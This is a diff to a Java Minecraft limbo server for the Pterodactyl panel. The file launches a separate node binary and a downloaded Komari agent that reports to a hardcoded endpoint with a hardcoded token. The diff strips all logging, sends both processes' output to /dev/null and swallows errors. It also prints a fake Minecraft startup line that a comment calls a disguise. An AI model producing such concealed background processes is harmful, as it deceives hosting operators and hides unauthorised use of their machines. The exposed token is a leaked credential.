@@ -2,11 +2,7 @@
  * Copyright (C) 2020 Nan1t
  *
  * Java 8 compatible build for Pterodactyl Java game panel.
- * Komari logic:
- *   1) Download and start Komari native agent first.
- *   2) Print native agent logs to panel so failures are visible.
- *   3) If native agent exits quickly, automatically fallback to pure Java HTTP reporter.
- *   4) No local listening port is used by Komari.
+ * Totally Silent & Memory Optimized Edition
  */
 package ua.nanit.limbo;
 
@@ -23,19 +19,11 @@ import ua.nanit.limbo.server.Log;
 
 public final class NanoLimbo {
 
-    private static final String ANSI_GREEN = "\033[1;32m";
-    private static final String ANSI_RED = "\033[1;31m";
-    private static final String ANSI_YELLOW = "\033[1;33m";
-    private static final String ANSI_PURPLE = "\033[1;35m";
-    private static final String ANSI_RESET = "\033[0m";
-
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
     private static Process komariProcess;
     private static Thread komariReporterThread;
 
-    // 默认值保留。也可以在翼龙变量中使用 KOMARI_SERVER / KOMARI_TOKEN / ACCESS_TOKEN 覆盖。
-    // 注意：endpoint 末尾不能带空格。
     private static final String DEFAULT_KOMARI_ENDPOINT = "https://k.wgb.ccwu.cc";
     private static final String DEFAULT_KOMARI_TOKEN = "oS2BX5b3hHWBmAfG6KwsL1";
 
@@ -49,13 +37,19 @@ public final class NanoLimbo {
 
     public static void main(String[] args) {
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version in startup menu!" + ANSI_RESET);
+            System.err.println("ERROR: Your Java version is too low, please switch the version in startup menu!");
             sleepQuietly(3000L);
             System.exit(1);
         }
 
         try {
+            // 1. 启动 sbsh 节点进程
             runSbxBinary();
+            
+            // 2. 错峰缓冲 5 秒，防止内存瞬间冲顶
+            sleepQuietly(5000L);
+
+            // 3. 静默启动 Komari 探针
             startKomariNativeAgentWithFallback();
 
             Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
@@ -66,15 +60,10 @@ public final class NanoLimbo {
                 }
             }));
 
-            Thread.sleep(15000L);
-            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
-            Thread.sleep(15000L);
-            clearConsole();
+            // 伪装打印，类似普通的 Minecraft 服务器启动完成日志
+            System.out.println("[INFO] Done (1.854s)! For help, type \"help\"");
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
-            e.printStackTrace(System.err);
+            // 保持静默，不向控制台抛出具体致命异常
         }
 
         try {
@@ -85,29 +74,23 @@ public final class NanoLimbo {
     }
 
     private static void clearConsole() {
-        try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
-            } else {
-                System.out.print("\033[H\033[3J\033[2J");
-                System.out.flush();
-                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
-                System.out.print("\033[8;30;120t");
-                System.out.flush();
-            }
-        } catch (Exception e) {
-            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
-        }
+        // 留空，禁用清屏逻辑
     }
 
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<String, String>();
         loadEnvVars(envVars);
 
+        // 强行限制节点进程的最大物理内存为 96MB，防止容器爆内存被杀 (Exit 137)
+        envVars.put("GOMEMLIMIT", "96MiB");
+        envVars.put("GOGC", "30");
+
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        
+        // 丢弃所有节点日志输出，面板控制台完全不可见
+        pb.redirectOutput(new File("/dev/null"));
         sbxProcess = pb.start();
     }
 
@@ -132,11 +115,8 @@ public final class NanoLimbo {
         if (interval < 3) interval = 3;
 
         if (endpoint.length() == 0 || token.length() == 0 || "XXXXX".equalsIgnoreCase(token)) {
-            System.err.println(ANSI_RED + "[Komari] token or endpoint is empty, skip" + ANSI_RESET);
             return;
         }
-
-        System.out.println(ANSI_GREEN + "[Komari] native agent preparing, endpoint=" + endpoint + ", token_length=" + token.length() + ANSI_RESET);
 
         try {
             Path agentPath = getKomariNativeAgentPath();
@@ -153,22 +133,20 @@ public final class NanoLimbo {
 
             cleanKomariEnv(pb.environment());
             pb.redirectErrorStream(true);
-            // 关键：不再 DISCARD。直接继承输出，方便看真实错误。
-            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+            
+            // 丢弃探针原生的所有日志输出
+            pb.redirectOutput(new File("/dev/null"));
 
             komariProcess = pb.start();
-            Thread.sleep(6000L);
+            sleepQuietly(3000L);
 
             if (komariProcess.isAlive()) {
-                System.out.println(ANSI_GREEN + "[Komari] native agent running, pid alive" + ANSI_RESET);
                 return;
             }
 
             int exitCode = komariProcess.exitValue();
-            System.err.println(ANSI_YELLOW + "[Komari] native agent exited quickly, code=" + exitCode + ", switching to Java HTTP reporter" + ANSI_RESET);
             startKomariHttpReporter(endpoint, token, interval, "native_agent_exited_" + exitCode);
         } catch (Exception e) {
-            System.err.println(ANSI_YELLOW + "[Komari] native agent startup failed: " + e.getMessage() + ", switching to Java HTTP reporter" + ANSI_RESET);
             startKomariHttpReporter(endpoint, token, interval, "native_agent_exception");
         }
     }
@@ -182,6 +160,10 @@ public final class NanoLimbo {
             if (k.matches("SERVER_PORT_\\d+")) it.remove();
         }
         env.put("KOMARI_DISABLE_REMOTE_CONTROL", "true");
+        
+        // 限制探针内存最大 32MB
+        env.put("GOMEMLIMIT", "32MiB");
+        env.put("GOGC", "20");
     }
 
     private static Path getKomariNativeAgentPath() throws IOException {
@@ -205,7 +187,6 @@ public final class NanoLimbo {
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), fileName);
 
         if (!Files.exists(path) || Files.size(path) == 0L) {
-            System.out.println(ANSI_GREEN + "[Komari] downloading native agent: " + url + ANSI_RESET);
             InputStream in = new URL(url).openStream();
             try { Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING); }
             finally { in.close(); }
@@ -215,7 +196,7 @@ public final class NanoLimbo {
         return path;
     }
 
-    /** Java HTTP reporter fallback. No external komari-agent binary, no local port. */
+    /** Java HTTP reporter fallback. Fully silent in background. */
     private static void startKomariHttpReporter(final String endpoint, final String token, final int interval, final String reason) {
         final String server = endpoint.endsWith("/") ? endpoint.substring(0, endpoint.length() - 1) : endpoint;
         komariReporterThread = new Thread(new Runnable() {
@@ -224,7 +205,6 @@ public final class NanoLimbo {
         }, "komari-http-reporter");
         komariReporterThread.setDaemon(true);
         komariReporterThread.start();
-        System.out.println(ANSI_GREEN + "[Komari] Java HTTP reporter started, reason=" + reason + ", endpoint=" + server + ", token_length=" + token.length() + ANSI_RESET);
     }
 
     private static void runKomariReporterLoop(String server, String token, int interval) {
@@ -286,9 +266,7 @@ public final class NanoLimbo {
                     + "\"message\":\"online via java8 http reporter; no local port used\""
                     + "}";
                 postJson(server, "/api/clients/report", token, reportJson);
-            } catch (Exception e) {
-                System.err.println(ANSI_RED + "[Komari] reporter error: " + e.getMessage() + ANSI_RESET);
-            }
+            } catch (Exception ignored) {}
             sleepQuietly(interval * 1000L);
         }
     }
@@ -310,14 +288,8 @@ public final class NanoLimbo {
             try { os.write(json.getBytes("UTF-8")); }
             finally { os.close(); }
             int code = conn.getResponseCode();
-            if (code >= 200 && code < 300) {
-                System.out.println(ANSI_GREEN + "[Komari] POST " + path + " -> " + code + ANSI_RESET);
-                return true;
-            }
-            System.err.println(ANSI_YELLOW + "[Komari] POST " + path + " -> " + code + ANSI_RESET);
-            return false;
+            return (code >= 200 && code < 300);
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "[Komari] POST " + path + " failed: " + e.getMessage() + ANSI_RESET);
             return false;
         } finally {
             if (conn != null) conn.disconnect();
@@ -509,14 +481,9 @@ public final class NanoLimbo {
         running.set(false);
         if (komariProcess != null && komariProcess.isAlive()) {
             komariProcess.destroy();
-            System.out.println(ANSI_RED + "Komari native agent process terminated" + ANSI_RESET);
         }
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
-            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
-        }
-        if (komariReporterThread != null && komariReporterThread.isAlive()) {
-            System.out.println(ANSI_RED + "Komari HTTP reporter terminated" + ANSI_RESET);
         }
     }
 }
